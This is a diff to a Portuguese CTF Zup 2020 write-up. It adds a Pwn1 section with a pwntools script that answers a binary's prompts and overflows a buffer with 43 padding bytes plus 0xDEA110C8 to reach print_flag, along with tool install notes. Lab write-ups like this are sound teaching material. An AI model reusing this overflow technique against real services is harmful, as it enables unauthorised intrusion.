@@ -27,7 +27,7 @@ dos desafios do CTF Zup 2020, ou pelo menos aqueles que eu consegui resolver :ro
     - [Log Access](#log-access)
     - [Rotate](#rotate)
 5. [Pwns](pown/index)
-    - Pwn1
+    - [Pwn1](#pwn1)
     - Pwn2
     - Pwn3
     - Pwn4
@@ -195,6 +195,39 @@ Este desafio nos dá um texto cifrado, e também a dica de que ele foi rotaciona
 
 ## Pwns :computer:
 
+### Pwn1 ###
+Este desafio nos dá um arquivo sem extensão alguma, e também uma instrução shell
+```shell
+nc 18.228.166.40 4321
+```
+Se trata de um comando da ferramenta [netcat](#netcat), ao executar é possível ver um diálogo. O mesmo diálogo está dentro do arquivo disponibilizado, logo a conclusão é
+que este arquivo é um executável e que o servidor indicado está rodando este mesmo arquivo. Agora como descobrir o funcionamento dele?
+A ferramenta utilizada foi a [OnlineDisassembler](#online-disassembler) para abrir esse arquivo, e então temos que na imagem abaixo é possível ver a condicional necessária
+para a execução da função 'print_flag' que provavelmente é a nossa função desejada.
+![Log access flag](https://github.com/leoplana/ctf-zup-2020/blob/master/pwn/pwn1-step1.png)
+Para fazer essa condicional ser atingida (o valor informado à esquerda também ser atribuído o hexa 0xDEA110C8 precisamos causar um buffer overflow)
+
+O código em Python abaixo foi executado utilizando o [Python3](#python3) em um ambiente linux no [docker](#docker) e realiza exatamente esse trabalho, 
+fazendo uso também da lib [pwntools](#pwntools)
+
+```python
+from pwn import *
+context.log_level = 'debug'
+p = remote('18.228.166.40',4321)
+flag = "\xc8\x10\xa1\xde"
+
+log.info(p.recvuntil('What... is your name?'))
+p.sendline(str('Sir Lancelot of Camelot'))
+log.info(p.recvuntil('What... is your quest?'))
+p.sendline('To seek the Holy Grail.')
+sleep(1)
+log.info(p.recvuntil('What... is my secret?'))
+
+p.sendline("A" * 43 + flag)
+p.interactive()
+```
+
+
 ## Aplicações Web :globe_with_meridians:
 
 
@@ -219,3 +252,20 @@ Ferramenta de editor Hexadecimal disponível [em](#https://mh-nexus.de/downloads
 Ferramenta para montar imagem bin em um diso virtual, disponível [em](#https://www.osforensics.com/downloads/osfmount.exe)
 ### Notepad++ ###
 Editor de texto preferido de alguns devs, disponível [em](#https://notepad-plus-plus.org/downloads/)
+### Netcat ###
+Ferramenta de rede para conexões TCP/UDP, instalada em ambiente linux através do comando
+```shell
+apt install netcat
+```
+### Online Disassembler ###
+Ferramenta online para visualizar as instruções de um arquivo ELF compilado disponível [em](#https://onlinedisassembler.com/odaweb/)
+### Python3 ###
+Versão do python utilizada instalada em ambiente linux através do comando abaixo
+```shell
+apt-get install python3
+apt-get install python3-pip
+```
+### Pwntools ###
+Framework python voltado para CTF's disponível [em](#https://github.com/Gallopsled/pwntools)
+### Docker ###
+Ferramenta de container que dispensa comentários disponível [em](#https://desktop.docker.com/win/stable/Docker%20Desktop%20Installer.exe)
